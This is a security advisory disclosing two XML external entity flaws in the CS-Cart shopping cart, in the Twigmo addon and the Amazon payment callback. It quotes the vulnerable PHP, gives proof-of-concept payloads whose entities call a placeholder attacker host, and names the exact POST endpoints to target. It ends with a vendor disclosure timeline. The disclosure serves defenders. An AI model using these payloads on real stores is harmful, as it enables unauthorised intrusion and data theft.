# Vendor home : cs-cart.com
# Author : Ahmed Sultan (@0x4148)
# Home : 0x4148.com
# Email : 0x4148@gmail.com
# Tested on : apache on windoes with php 5.4.4 / apache on linux with php <5.2.17
 
From vendor site
experience.
With loads of features at a great price, CS-Cart is a great shopping cart
solution that will quickly enable your online store to do business.
 
XXE I : Twimgo addon
app/addons/twigmo/Twigmo/Api/ApiData.php
Line 131
public static function parseDocument($data, $format =
TWG_DEFAULT_DATA_FORMAT)
{
if ($format == &#039;xml&#039;) {
$result = @simplexml_load_string($data, &#039;SimpleXMLElement&#039;,
LIBXML_NOCDATA);
return self::getObjectAsArray($result);
} elseif ($format == &#039;jsonp&#039;) {
return (array) json_decode($data, true);
} elseif ($format == &#039;json&#039;) {
return (array) json_decode($data, true);
}
 
return false;
}
POC
<?php
$xml="
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM &#039;http://YOUR_HOST/0x4148.jnk&#039; >]>
<document>
<Author>Ahmed sultan (0x4148)</Author>
<killit>&xxe;</killit>
</document>
";
echo rawurlencode(base64_encode($xml));
?>
 
change YOUR_HOST to your server address , use the output in the following
POST request
Action -> HOST/cs-cart/index.php?dispatch=twigmo.post
Data -> action=add_to_cart&data=DATA_OUT_PUT_HERE&format=xml
a GET request will be sent to your webserver from the vulnerable host
indicating successful attack
(Require twimgo addon to be activated)
 
XXE II : Amazon payment
File : app/payments/amazon/amazon_callback.php
Line 16
use Tygh\Registry;
 
if (!defined(&#039;BOOTSTRAP&#039;)) { die(&#039;Access denied&#039;); }
 
include_once (Registry::get(&#039;config.dir.payments&#039;) .
&#039;amazon/amazon_func.php&#039;);
 
fn_define(&#039;AMAZON_ORDER_DATA&#039;, &#039;Z&#039;);
 
if (!empty($_POST[&#039;order-calculations-request&#039;])) {
$xml_response = $_POST[&#039;order-calculations-request&#039;];
 
} elseif (!empty($_POST[&#039;NotificationData&#039;])) {
$xml_response = $_POST[&#039;NotificationData&#039;];
}
 
if (!empty($_POST[&#039;order-calculations-error&#039;])) {
// Process the Amazon callback error
$xml_error = $_POST[&#039;order-calculations-error&#039;];
$xml = @simplexml_load_string($xml_error);
if (empty($xml)) {
$xml = @simplexml_load_string(stripslashes($xml_error));
}
 
// Get error message
$code = (string) $xml->OrderCalculationsErrorCode;
$message = (string) $xml->OrderCalculationsErrorMessage;
 
POC
sending POST request to
app/payments/amazon/amazon_checkout.php
setting POST parameter order-calculations-request to
<?xml version=&#039;1.0&#039;?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://host/amazon.jnk" >]>
<document>
<Author>Ahmed sultan (0x4148)</Author>
<killit>%26xxe%3b</killit>
</document>
 
Will result in an GET request to your host from the vulnerable machine ,
indicating successful attack
(Require amazon payment method to be activated)
 
 
Disclosure time line
10/11 vulnerabilities reported to the vendor
11/11 Vendor asked for extra details
12/11 Vendor acknowledged the validity of vulnerabilities and asked for
time to fix
16/11 vendor permitted public release
 
Reference
https://0x4148.com/2016/11/10/cs-cart/

